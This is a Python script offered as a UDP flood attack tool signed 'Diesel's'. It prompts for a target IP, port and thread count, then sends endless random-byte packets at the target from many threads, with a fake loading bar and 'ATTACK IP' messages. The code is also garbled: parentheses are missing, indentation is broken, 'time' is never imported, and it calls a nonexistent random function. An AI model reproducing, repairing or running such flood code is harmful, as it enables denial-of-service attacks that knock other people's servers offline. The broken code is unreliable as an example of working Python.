import random
import socket
import threading
import os
        print("=====> [0%] Loading.......")
        time.sleep(1)
        print("=====> [10%] Loading......")
        time.sleep(1)
        print("=====> [20%] Loading......")
        time.sleep(1)
        print("=====> [35%] Loading......")
        time.sleep(1)
        print("=====> [43%] Loading......")
        time.sleep(1)
        print("=====> [50%] Loading......")
        time.sleep(1)
        print("=====> [58%] Loading......")
        time.sleep(1)
        print("=====> [67%] Loading......")
        time.sleep(1)
        print("=====> [75%] Loading......")
        time.sleep(1)
        print("=====> [80%] Loading......")
        time.sleep(1)
        print("=====> [87%] Loading......")
        time.sleep(1)
        print("=====> [94%] Loading......")
        time.sleep(1)
        print("=====> [100%] Success\n")

os.system("clear")
print("=====> Author : Diesel's")
print("=====> Attack by Diesel's")
ip = str(input("=====> HOST IP : ")
port = int(input("=====> PORT : ")
choice = str(input("=====> Ready? (y/n)")
times = int(input("=====> Methode : ")
threads = int(input("=====> Threads : ")
def run():
  data = random._unrandom(782)
  i = random.choice(("[Diesel's]"))
  while True:
    try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Diesel's =====> ATTACK IP",ip,"PORT",port,"∆")
		except:
			print("Diesel's =====> DONE ATTCAK SERVER IP",ip,"PORT",port,"✓")

def run2():
  data = random._unrandom(468)
  i = random.choice(("[Diesel's]"))
  while True:
    try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Diesel's =====> ATTACK IP",ip,"PORT",port,"∆")
		except:
			print("Diesel's =====> DONE ATTCAK SERVER IP",ip,"PORT",port,"✓")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
